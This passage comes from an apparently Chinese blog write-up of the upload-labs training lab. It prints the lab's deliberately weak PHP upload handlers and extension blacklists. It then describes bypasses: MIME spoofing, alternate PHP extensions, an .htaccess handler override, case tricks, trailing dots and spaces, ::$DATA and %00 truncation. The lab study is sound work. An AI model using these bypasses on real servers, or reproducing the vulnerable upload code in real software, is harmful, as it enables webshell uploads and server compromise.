class="string">&#x27;tmp_name&#x27;</span>];<span class="comment">//获取临时文件名</span></span><br><span class="line">        $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//上传目录+上传时的文件名</span></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;<span class="comment">//把临时文件移到UPLOAD_PATH目录</span></span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再来看下PHP代码,<code>UPLOAD_PATH</code>是在<code>config.php</code>文件里面的常量<code>define(&quot;UPLOAD_PATH&quot;, &quot;../upload/&quot;);</code>,PHP的代码没有什么过滤的，直接就可以上传了。</p><p>表单上传文件变量是<code>upload_file</code></p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527122346767.png" alt="image-20200527122346767"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> method=<span class="string">&quot;post&quot;</span> onsubmit=<span class="string">&quot;return checkFile()&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>Get到<code>javascript</code>的知识点：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onsubmit=<span class="string">&quot;return false;&quot;</span> 将无论何时都阻止表单的提交</span><br><span class="line">onsubmit=<span class="string">&quot;return check();&quot;</span> 是否提交表单取决于check()的返回值</span><br><span class="line">onsubmit=<span class="string">&quot;check();&quot;</span> check()的返回值无影响</span><br></pre></td></tr></table></figure><h2 id="Pass-02（MIME）"><a href="#Pass-02（MIME）" class="headerlink" title="Pass-02（MIME）"></a>Pass-02（MIME）</h2><p>第二关主要是检查<code>MIME</code>，直接抓包修改<code>Content-Type</code>（例如：<code>image/gif</code>、<code>image/png</code>、<code>image/jpeg</code>其中一个就行了）上传即可</p><p>有关Content-Type可以参考<code>https://www.cnblogs.com/52fhy/p/5436673.html</code></p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527103658737.png" alt="image-20200527103658737"></p><blockquote><p>注意需要带上<code>Content-Type: image/jpeg</code></p></blockquote><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-04（特殊可解析后缀）"><a href="#Pass-04（特殊可解析后缀）" class="headerlink" title="Pass-04（特殊可解析后缀）"></a>Pass-04（特殊可解析后缀）</h2><h3 id="可重写文件解析规则绕过"><a href="#可重写文件解析规则绕过" class="headerlink" title="可重写文件解析规则绕过"></a><strong>可重写文件解析规则绕过</strong></h3><p>由于禁止上传<code>.asp|.aspx|.php|.jsp</code>后缀文件！，所以我们要想尽办法去绕过，而且后台把你的文件名重命名了</p><h3 id="1-重写项或者另类名称"><a href="#1-重写项或者另类名称" class="headerlink" title="1 重写项或者另类名称"></a><strong>1 重写项或者另类名称</strong></h3><p>尝试可能未禁止的后缀类型，这里能够经过burpsuite抓包而后使用intruder模块进行测试<br>首先开始代理，打开burpsuite进行抓包，右键发送到intruder模块(可参考：<code>https://www.shangmayuan.com/a/580f4475223e407d8de8a752.html</code>)</p><p><code>.php可以写成.pphphp</code>这样是可以绕过的</p><p>尝试另类文件名绕过。（<code>phtml，php3，php4, php5, pht</code>等）直接抓包修改文件后缀，将php改为phtml，php3，php4, php5, pht等，上传成功</p><p>但是很鸡肋，如果服务器没有配置别名解析，上传上去是无法被解析执行的。<br>如果无法解析执行，需要修改apache配置文件。</p><p>修改apache2配置文件，添加下面这句话<br><code>AddType application/x-httpd-php .php .phtml .phps .php3 .php5 .pht</code></p><h3 id="2-先上传个-htaccess文件，让解析规则变更"><a href="#2-先上传个-htaccess文件，让解析规则变更" class="headerlink" title="2 先上传个.htaccess文件，让解析规则变更"></a><strong>2 先上传个.htaccess文件，让解析规则变更</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="3-双后缀名-疑惑"><a href="#3-双后缀名-疑惑" class="headerlink" title="3 双后缀名(疑惑)"></a><strong>3 双后缀名(疑惑)</strong></h3><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527112238670.png" alt="image-20200527112238670"></p><h3 id="4-aa-url解码"><a href="#4-aa-url解码" class="headerlink" title="4 %aa url解码"></a><strong>4 %aa url解码</strong></h3><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-04（htaccess、后缀名黑名单、过滤）"><a href="#Pass-04（htaccess、后缀名黑名单、过滤）" class="headerlink" title="Pass-04（htaccess、后缀名黑名单、过滤）"></a>Pass-04（htaccess、<strong>后缀名黑名单、过滤</strong>）</h2><p><strong>源码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考：<code>https://dylan903.github.io/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/#toc-heading-7</code></p><h3 id="1-、htaccess文件"><a href="#1-、htaccess文件" class="headerlink" title="1 、htaccess文件"></a>1 、htaccess文件</h3><p><code>.htaccess</code>是Apache的又一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件。</p><p>Apache的配置文件在<code>/etc/httpd/conf</code>下面的<code>httpd.conf</code></p><p>要想使.htaccess文件生效，需要<strong>两个条件</strong></p><p><strong>一</strong>是在Apache的配置文件中写上：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure><p><strong>二</strong>是Apache要加载<code>mod_Rewrite</code>模块。加载该模块，需要在Apache的配置文件中写上：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>新版的Apache配置文件包含在<code>/etc/httpd/conf.modules.d</code>里面</p><p>该部分参考于：<code>https://zhuanlan.zhihu.com/p/52099683</code></p><hr><p>先上传<code>.htaccess</code>文件，文件内容如下(引号内替换成你要上传执行的文件名)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;cmd.jpeg&quot;&gt;</span><br><span class="line">  SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>windows系统文件不能命名为<code>.*</code>，所以在上传的时候抓包，改文件名，删掉点前面的</p><blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php jpg</span><br></pre></td></tr></table></figure><p>意思是：网站的<code>jpg</code>后缀都作为php文件来执行</p></blockquote><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527161804587.png" alt="image-20200527161804587"><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527161822781.png" alt="image-20200527161822781"></p><h3 id="2、黑名单"><a href="#2、黑名单" class="headerlink" title="2、黑名单"></a>2、<strong>黑名单</strong></h3><p>比如文件名后缀大小写混合绕过。.php改成.phP然后上传即可。感觉和XSS的一些过滤绕过非常相似。</p><h3 id="3、可被利用过滤"><a href="#3、可被利用过滤" class="headerlink" title="3、可被利用过滤"></a>3、<strong>可被利用过滤</strong></h3><p>这种只删除一次php的，即可：<br><strong>双写文件名绕过</strong>，文件名改成xx.pphphp</p><h2 id="Pass-06（大小写-windows特性）"><a href="#Pass-06（大小写-windows特性）" class="headerlink" title="Pass-06（大小写+windows特性）"></a>Pass-06（大小写+windows特性）</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../common.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-大小写"><a href="#1-大小写" class="headerlink" title="1 大小写"></a>1 大小写</h3><p>这一关把<code>.htaccess</code>后缀也禁止了，查看源代码，发现把转换成小写的代码去掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br></pre></td></tr></table></figure><p>因此我们可以上传Php、phP之类的来绕过黑名单后缀，成功上传。<br>(在Linux没有特殊配置的情况下，这种情况只有win可以解析执行，因为win会忽略大小写)</p><h3 id="2-利用Windows系统的文件名特性"><a href="#2-利用Windows系统的文件名特性" class="headerlink" title="2 利用Windows系统的文件名特性"></a>2 <strong>利用Windows系统的文件名特性</strong></h3><p>比如文件名最后增加点和空格，写成<code>.php..</code>，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是.php</p><blockquote><p>该函数简单明了，就是消掉末尾的点。也就是说只要构造”.php. .”即可绕过检测，当<code>deldot</code>函数检测到末尾的第一个点时将继续从后向前检测，当检测到空格时return xxx.php. (这里结尾时空格),接下来执行trim函数将去掉末尾的空格，最终文件名为 test.php. 由于windows特性，最后将变为test.php。</p></blockquote><h4 id="deldot函数"><a href="#deldot函数" class="headerlink" title="deldot函数"></a>deldot函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">        $c = substr($s,$i,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> and $c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="3-Windows文件流特性绕过"><a href="#3-Windows文件流特性绕过" class="headerlink" title="3 Windows文件流特性绕过"></a>3 <strong>Windows文件流特性绕过</strong></h3><p>文件名改成.php::$DATA，上传成功后保存的文件名其实是.php</p><h2 id="Pass-07（空格、-00截断绕过）"><a href="#Pass-07（空格、-00截断绕过）" class="headerlink" title="Pass-07（空格、%00截断绕过）"></a>Pass-07（空格、%00截断绕过）</h2><p>这一关，少了这一段代码<br><code>$file_ext = trim($file_ext); //首尾去空</code></p><p>可以进行空格绕过，直接抓包修改文件名，再文件名末尾添加空格，成功上传</p><h3 id="上传路径名-00截断绕过"><a href="#上传路径名-00截断绕过" class="headerlink" title="上传路径名%00截断绕过"></a><strong>上传路径名%00截断绕过</strong></h3><p>上传的文件名写成11.jpg, save_path改成../upload/11.php%00，最后保存下来的文件就是11.php</p><p><strong>Note：</strong>先尝试<code>其余类型、大小写混淆、双写、添加.、添加::$DATA</code>均无效，尝试末尾添加空格，成功上传</p><h2 id="Pass-08（点）"><a href="#Pass-08（点）" class="headerlink" title="Pass-08（点）"></a>Pass-08（点）</h2><p>这一关少了这段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点</span><br></pre></td></tr></table></figure><p>没有对后缀名进行去”.”处理，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过</p><h2 id="Pass-9（-DATA）"><a href="#Pass-9（-DATA）" class="headerlink" title="Pass-9（::$DATA）"></a>Pass-9（::$DATA）</h2><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, 